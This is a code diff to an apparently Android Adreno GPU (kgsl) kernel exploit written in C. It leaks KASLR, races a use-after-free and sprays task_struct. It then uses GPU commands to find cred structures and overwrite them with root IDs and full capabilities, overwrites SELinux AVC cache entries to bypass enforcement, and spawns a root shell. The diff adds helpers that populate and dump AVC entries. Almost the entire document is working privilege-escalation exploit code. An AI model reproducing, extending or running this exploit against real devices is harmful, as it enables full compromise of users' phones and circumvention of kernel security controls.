@@ -56,7 +56,6 @@ static uint64_t detect_kaslr(uint64_t *base_out) {
     struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
     uint64_t head = pmp->data_head;
     uint64_t tail = pmp->data_tail;
-
     uint8_t *data = (uint8_t *)buf + pmp->data_offset;
     uint64_t data_size = pmp->data_size;
 
@@ -171,6 +170,51 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
+static void gen_avc_entries(void) {
+    for (int pid = 1; pid <= 500; pid++) {
+        char path[64];
+        snprintf(path, sizeof(path), "/proc/%d/status", pid);
+        int fd = open(path, O_RDONLY);
+        if (fd >= 0) {
+            char tmp[64];
+            read(fd, tmp, 64);
+            close(fd);
+        }
+        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
+        fd = open(path, O_RDONLY);
+        if (fd >= 0) close(fd);
+    }
+    for (int i = 0; i < 1000; i++) {
+        char path[64];
+        snprintf(path, sizeof(path), "/sys/fs/selinux/class/%d", i % 100);
+        int fd = open(path, O_RDONLY);
+        if (fd >= 0) close(fd);
+        fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+        if (fd >= 0) close(fd);
+    }
+}
+
+static void dump_avc_page(uint64_t va, uint32_t *d, int n_slots) {
+    printf("\n  AVC candidate @ 0x%llx\n", (unsigned long long)va);
+    int shown = 0;
+    for (int slot = 0; slot < 56 && shown < n_slots; slot++) {
+        int idx = slot * 72 / 4;
+        if (idx + 13 >= AVC_SCAN_DWORDS) break;
+        uint32_t ssid = d[idx];
+        uint32_t tsid = d[idx+1];
+        uint32_t tclass = d[idx+2] & 0xFFFF;
+        uint32_t allowed = d[idx+3];
+        uint64_t pprev = ((uint64_t)d[idx+13] << 32) | d[idx+12];
+        uint32_t pprev_hi = d[idx+13];
+        if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
+            tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
+            printf("  [%2d] ssid=%-5u tsid=%-5u tclass=%-3u allowed=0x%08x pprev=0x%012llx\n",
+                   slot, ssid, tsid, tclass, allowed, (unsigned long long)pprev & 0xFFFFFFFFFFFFULL);
+            shown++;
+        }
+    }
+}
+
 int main(int argc, char **argv) {
     (void)argc; (void)argv;
     setbuf(stdout, NULL);
@@ -247,7 +291,8 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    printf("[*] Phase 5: Spawning task_struct spray (%d children)\n", SPRAY_PIDS);
+    // ===== Phase 5: Spawn task_struct spray with AVC generation =====
+    printf("[*] Phase 5: Spawning task_struct spray (%d children) + AVC generation\n", SPRAY_PIDS);
     int notify_pipe[2];
     if (pipe(notify_pipe) < 0) die("pipe");
     fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
@@ -260,6 +305,8 @@ int main(int argc, char **argv) {
         if (p == 0) {
             close(notify_pipe[0]);
             prctl(PR_SET_NAME, "TASKUAF!!");
+            // Generate AVC entries to fill slab caches
+            gen_avc_entries();
             for (int j = 0; j < 1800; j++) {
                 usleep(200000);
                 if (getuid() == 0) {
@@ -279,7 +326,7 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    
+    // ===== Phase 6: Scan for cred pages =====
     printf("[*] Phase 6: GPU scan for cred pages (pattern 0x000007D0)\n");
     unsigned int ctx_id = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
@@ -342,6 +389,7 @@ int main(int argc, char **argv) {
         return 1;
     }
 
+    // ===== Phase 7: Overwrite cred =====
     printf("[*] Phase 7: Overwrite cred fields (uid=0, caps=full)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
         uint64_t cbase = cred_pages[p] + cred_offs[p];
@@ -350,7 +398,6 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
 
-        
         uint64_t uid_base = cbase + 0x04;
         for (int i = 0; i < 8; i++) {
             uint32_t al, ah;
@@ -360,7 +407,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0;
         }
 
-        
         uint64_t cap_base = cbase + 0x28;
         for (int i = 0; i < 4; i++) {
             uint32_t al, ah;
@@ -379,11 +425,10 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    
+    // ===== Phase 8: AVC bypass =====
     printf("[*] Phase 8: GPU scan for AVC cache pages in UAF area\n");
     uint64_t avc_vas[256];
     int n_avc = 0;
-    
     for (uint64_t va = scan_start; va < end_va && n_avc < 256; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
         memset(ib_m, 0, 0x10000);
@@ -422,7 +467,7 @@ int main(int argc, char **argv) {
             }
         }
         if (ahits >= 3) {
-            printf("\n  [AVC] va=0x%lx ahits=%d\n", (unsigned long)va, ahits);
+            dump_avc_page(va, d, ahits > 20 ? 20 : ahits);
             avc_vas[n_avc] = va;
             n_avc++;
         }
@@ -451,7 +496,7 @@ int main(int argc, char **argv) {
                 wait_timestamp(kgsl_fd, ctx_id, ts);
         }
         flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] AVC allowed overwritten (SELinux should be effectively permissive)\n");
+        printf("[+] AVC allowed overwritten\n");
     } else {
         printf("[-] No AVC pages found, fallback to direct kernel variable zeroing\n");
         {
@@ -517,7 +562,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0, SELinux effectively permissive via AVC) - type exit to quit\n  # ");
+        printf("\n  # ROOT SHELL (uid=0, SELinux permissive via AVC) - type exit to quit\n  # ");
         fflush(stdout);
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
